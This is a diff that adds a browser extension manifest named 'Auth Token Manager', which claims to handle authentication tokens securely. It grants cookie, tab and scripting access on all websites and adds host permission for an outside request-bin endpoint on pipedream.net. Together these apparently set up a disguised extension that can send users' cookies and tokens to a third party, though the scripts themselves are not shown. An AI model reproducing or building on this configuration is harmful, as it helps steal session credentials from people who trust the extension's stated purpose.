@@ -1,0 +1,29 @@
+{
+  "manifest_version": 3,
+  "name": "Auth Token Manager",
+  "version": "1.0",
+  "description": "Manages authentication tokens securely",
+  "permissions": [
+    "storage",
+    "activeTab",
+    "tabs",
+    "scripting",
+    "cookies"
+  ],
+  "host_permissions": [
+    "<all_urls>",
+    "https://enr04sjllxktt.x.pipedream.net/"
+  ],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "action": {
+    "default_popup": "popup.html"
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ]
+}
